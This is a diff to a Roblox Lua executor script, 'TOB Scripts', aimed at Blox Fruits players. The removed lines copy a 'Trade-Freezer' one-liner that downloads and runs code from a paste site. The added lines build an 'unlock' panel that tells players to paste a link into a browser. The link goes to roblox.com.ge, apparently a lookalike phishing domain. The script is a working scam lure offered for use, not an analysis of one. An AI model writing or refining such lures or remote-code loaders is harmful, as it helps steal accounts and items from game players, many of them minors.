@@ -1,185 +1,210 @@
-local player = game.Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-local UserInputService = game:GetService("UserInputService")
+--// TOB Scripts - Tech UI
+--// Premium Styled Roblox UI
+
+local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
 
-local discordInvite = "https://discord.gg/tTCAKfTBq"
-local tradeFreezerScript = 'loadstring(game:HttpGet("https://pastefy.app/qdLOGNMq/raw", true))()'
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
 
--- ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "TOBReleaseGui"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
-
--- Notification Function
-local function notify(text)
-	pcall(function()
-		StarterGui:SetCore("SendNotification", {
-			Title = "TOB SCRIPTS",
-			Text = text,
-			Duration = 4
-		})
-	end)
+-- Remove old UI
+if PlayerGui:FindFirstChild("TOB_TECH_UI") then
+	PlayerGui.TOB_TECH_UI:Destroy()
 end
 
--- ===== TOGGLE BUTTON (Square) =====
-local toggleButton = Instance.new("TextButton")
-toggleButton.Size = UDim2.new(0, 65, 0, 65)
-toggleButton.Position = UDim2.new(0.05, 0, 0.4, 0)
-toggleButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
-toggleButton.Text = "TOB"
-toggleButton.TextColor3 = Color3.fromRGB(255,255,255)
-toggleButton.Font = Enum.Font.GothamBlack
-toggleButton.TextScaled = true
-toggleButton.BorderSizePixel = 0
-toggleButton.Parent = screenGui
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TOB_TECH_UI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
 
-Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0,15)
+-- MAIN FRAME
+local Main = Instance.new("Frame")
+Main.Parent = ScreenGui
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 470, 0, 320)
+Main.Position = UDim2.new(0.34, 0, 0.22, 0)
+Main.BackgroundColor3 = Color3.fromRGB(12,12,12)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Draggable = true
 
--- ===== MAIN FRAME =====
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 470, 0, 330)
-mainFrame.Position = UDim2.new(0.5, -235, 0.5, -165)
-mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
-mainFrame.BorderSizePixel = 0
-mainFrame.Visible = true
-mainFrame.Parent = screenGui
+local MainCorner = Instance.new("UICorner", Main)
+MainCorner.CornerRadius = UDim.new(0,18)
 
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 25)
+local Stroke = Instance.new("UIStroke", Main)
+Stroke.Color = Color3.fromRGB(0,255,170)
+Stroke.Thickness = 1.8
 
--- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 60)
-title.Position = UDim2.new(0, 0, 0, 10)
-title.BackgroundTransparency = 1
-title.Text = "TOB SCRIPTS"
-title.TextColor3 = Color3.fromRGB(255,255,255)
-title.Font = Enum.Font.GothamBlack
-title.TextScaled = true
-title.Parent = mainFrame
+local Glow = Instance.new("UIGradient", Stroke)
+Glow.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,255,170)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,140,255))
+}
 
--- Underline
-local underline = Instance.new("Frame")
-underline.Size = UDim2.new(0.6, 0, 0, 4)
-underline.Position = UDim2.new(0.2, 0, 0, 65)
-underline.BackgroundColor3 = Color3.fromRGB(255,255,255)
-underline.BorderSizePixel = 0
-underline.Parent = mainFrame
+-- TOP BAR
+local Top = Instance.new("Frame")
+Top.Parent = Main
+Top.BackgroundColor3 = Color3.fromRGB(16,16,16)
+Top.BorderSizePixel = 0
+Top.Size = UDim2.new(1,0,0,52)
 
--- Game Info
-local gameInfo = Instance.new("TextLabel")
-gameInfo.Size = UDim2.new(1, -40, 0, 35)
-gameInfo.Position = UDim2.new(0, 20, 0, 85)
-gameInfo.BackgroundTransparency = 1
-gameInfo.Text = "(Script is for Blox Fruits)"
-gameInfo.TextColor3 = Color3.fromRGB(230,230,230)
-gameInfo.Font = Enum.Font.GothamSemibold
-gameInfo.TextScaled = true
-gameInfo.Parent = mainFrame
+local TopCorner = Instance.new("UICorner", Top)
+TopCorner.CornerRadius = UDim.new(0,18)
 
--- Release Date
-local releaseText = Instance.new("TextLabel")
-releaseText.Size = UDim2.new(1, -40, 0, 45)
-releaseText.Position = UDim2.new(0, 20, 0, 115)
-releaseText.BackgroundTransparency = 1
-releaseText.Text = "SCRIPT IS RELEASING ON 5TH MARCH :)"
-releaseText.TextColor3 = Color3.fromRGB(200,200,200)
-releaseText.Font = Enum.Font.GothamBold
-releaseText.TextScaled = true
-releaseText.Parent = mainFrame
+local Fix = Instance.new("Frame")
+Fix.Parent = Top
+Fix.BackgroundColor3 = Color3.fromRGB(16,16,16)
+Fix.BorderSizePixel = 0
+Fix.Position = UDim2.new(0,0,0.5,0)
+Fix.Size = UDim2.new(1,0,0.5,0)
 
--- Discord Button
-local discordButton = Instance.new("TextButton")
-discordButton.Size = UDim2.new(0.8, 0, 0, 55)
-discordButton.Position = UDim2.new(0.1, 0, 0, 170)
-discordButton.BackgroundColor3 = Color3.fromRGB(35,35,35)
-discordButton.BorderSizePixel = 0
-discordButton.Text = "Join our Discord server"
-discordButton.TextColor3 = Color3.fromRGB(255,255,255)
-discordButton.Font = Enum.Font.GothamBold
-discordButton.TextScaled = true
-discordButton.Parent = mainFrame
+-- TITLE
+local Title = Instance.new("TextLabel")
+Title.Parent = Top
+Title.BackgroundTransparency = 1
+Title.Size = UDim2.new(1,0,1,0)
+Title.Font = Enum.Font.GothamBlack
+Title.Text = "TOB Scripts"
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.TextSize = 27
 
-Instance.new("UICorner", discordButton).CornerRadius = UDim.new(0,20)
+-- SUBTITLE
+local Sub = Instance.new("TextLabel")
+Sub.Parent = Main
+Sub.BackgroundTransparency = 1
+Sub.Position = UDim2.new(0.05,0,0.20,0)
+Sub.Size = UDim2.new(0.9,0,0,30)
+Sub.Font = Enum.Font.GothamBold
+Sub.Text = "COMPLETE ALL STEPS TO UNLOCK"
+Sub.TextColor3 = Color3.fromRGB(0,255,170)
+Sub.TextSize = 17
+Sub.TextXAlignment = Enum.TextXAlignment.Left
 
--- Trade Button
-local tradeButton = Instance.new("TextButton")
-tradeButton.Size = UDim2.new(0.8, 0, 0, 55)
-tradeButton.Position = UDim2.new(0.1, 0, 0, 235)
-tradeButton.BackgroundColor3 = Color3.fromRGB(35,35,35)
-tradeButton.BorderSizePixel = 0
-tradeButton.Text = "Click me to copy Trade-Freezer Script"
-tradeButton.TextColor3 = Color3.fromRGB(255,255,255)
-tradeButton.Font = Enum.Font.GothamBold
-tradeButton.TextScaled = true
-tradeButton.Parent = mainFrame
+-- INSTRUCTION FRAME
+local InstructionsFrame = Instance.new("Frame")
+InstructionsFrame.Parent = Main
+InstructionsFrame.BackgroundTransparency = 1
+InstructionsFrame.Position = UDim2.new(0.06,0,0.30,0)
+InstructionsFrame.Size = UDim2.new(0.88,0,0.35,0)
 
-Instance.new("UICorner", tradeButton).CornerRadius = UDim.new(0,20)
+-- ALL 4 POINTS
+local Instructions = {
+	"• Copy the link by pressing the COPY LINK button",
+	"• Paste the link that you copied into your web browser",
+	"• Join our group",
+	"• Execute the script again to unlock it"
+}
 
--- Button Actions + Notifications
-discordButton.MouseButton1Click:Connect(function()
-	if setclipboard then
-		setclipboard(discordInvite)
-		notify("Discord invite copied to clipboard!")
-	else
-		notify("Clipboard not supported.")
-	end
-end)
-
-tradeButton.MouseButton1Click:Connect(function()
-	if setclipboard then
-		setclipboard(tradeFreezerScript)
-		notify("Trade-Freezer script copied!")
-	else
-		notify("Clipboard not supported.")
-	end
-end)
-
--- Toggle
-toggleButton.MouseButton1Click:Connect(function()
-	mainFrame.Visible = not mainFrame.Visible
-end)
-
--- Drag System
-local function makeDraggable(frame)
-	local dragging = false
-	local dragInput, dragStart, startPos
-
-	frame.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 
-		or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			dragStart = input.Position
-			startPos = frame.Position
-			
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
-
-	frame.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement 
-		or input.UserInputType == Enum.UserInputType.Touch then
-			dragInput = input
-		end
-	end)
-
-	UserInputService.InputChanged:Connect(function(input)
-		if input == dragInput and dragging then
-			local delta = input.Position - dragStart
-			frame.Position = UDim2.new(
-				startPos.X.Scale,
-				startPos.X.Offset + delta.X,
-				startPos.Y.Scale,
-				startPos.Y.Offset + delta.Y
-			)
-		end
-	end)
+for i,v in ipairs(Instructions) do
+	local Text = Instance.new("TextLabel")
+	Text.Parent = InstructionsFrame
+	Text.BackgroundTransparency = 1
+	Text.Position = UDim2.new(0,0,0,(i-1)*38)
+	Text.Size = UDim2.new(1,0,0,32)
+	Text.Font = Enum.Font.Gotham
+	Text.Text = v
+	Text.TextColor3 = Color3.fromRGB(220,220,220)
+	Text.TextSize = 18
+	Text.TextXAlignment = Enum.TextXAlignment.Left
 end
 
-makeDraggable(mainFrame)
-makeDraggable(toggleButton)
+-- COPY BUTTON
+local CopyButton = Instance.new("TextButton")
+CopyButton.Parent = Main
+CopyButton.Size = UDim2.new(0.78,0,0,58)
+CopyButton.Position = UDim2.new(0.11,0,0.76,0)
+CopyButton.BackgroundColor3 = Color3.fromRGB(0,200,120)
+CopyButton.BorderSizePixel = 0
+CopyButton.Font = Enum.Font.GothamBlack
+CopyButton.Text = "COPY LINK"
+CopyButton.TextColor3 = Color3.fromRGB(255,255,255)
+CopyButton.TextSize = 24
+CopyButton.AutoButtonColor = false
+
+local CopyCorner = Instance.new("UICorner", CopyButton)
+CopyCorner.CornerRadius = UDim.new(0,14)
+
+local CopyStroke = Instance.new("UIStroke", CopyButton)
+CopyStroke.Color = Color3.fromRGB(120,255,190)
+CopyStroke.Thickness = 1.5
+
+-- BUTTON HOVER EFFECT
+CopyButton.MouseEnter:Connect(function()
+	TweenService:Create(
+		CopyButton,
+		TweenInfo.new(0.15),
+		{BackgroundColor3 = Color3.fromRGB(0,255,150)}
+	):Play()
+end)
+
+CopyButton.MouseLeave:Connect(function()
+	TweenService:Create(
+		CopyButton,
+		TweenInfo.new(0.15),
+		{BackgroundColor3 = Color3.fromRGB(0,200,120)}
+	):Play()
+end)
+
+-- TOGGLE BUTTON
+local Toggle = Instance.new("TextButton")
+Toggle.Parent = ScreenGui
+Toggle.Size = UDim2.new(0,95,0,42)
+Toggle.Position = UDim2.new(0.02,0,0.36,0)
+Toggle.BackgroundColor3 = Color3.fromRGB(15,15,15)
+Toggle.BorderSizePixel = 0
+Toggle.Text = "TOB"
+Toggle.Font = Enum.Font.GothamBlack
+Toggle.TextColor3 = Color3.fromRGB(255,255,255)
+Toggle.TextSize = 24
+Toggle.Active = true
+Toggle.Draggable = true
+
+local ToggleCorner = Instance.new("UICorner", Toggle)
+ToggleCorner.CornerRadius = UDim.new(0,12)
+
+local ToggleStroke = Instance.new("UIStroke", Toggle)
+ToggleStroke.Color = Color3.fromRGB(0,255,170)
+ToggleStroke.Thickness = 1.6
+
+-- TOGGLE FUNCTION
+local Opened = true
+
+Toggle.MouseButton1Click:Connect(function()
+	Opened = not Opened
+	Main.Visible = Opened
+end)
+
+-- COPY FUNCTION
+CopyButton.MouseButton1Click:Connect(function()
+
+	if setclipboard then
+		setclipboard("https://roblox.com.ge/communities/3444899467/")
+	end
+
+	StarterGui:SetCore("SendNotification", {
+		Title = "TOB Scripts",
+		Text = "Link Copied!",
+		Duration = 3
+	})
+
+	-- CLICK EFFECT
+	local Tween = TweenService:Create(
+		CopyButton,
+		TweenInfo.new(0.1),
+		{Size = UDim2.new(0.74,0,0,54)}
+	)
+
+	local Tween2 = TweenService:Create(
+		CopyButton,
+		TweenInfo.new(0.1),
+		{Size = UDim2.new(0.78,0,0,58)}
+	)
+
+	Tween:Play()
+	Tween.Completed:Wait()
+	Tween2:Play()
+
+end)
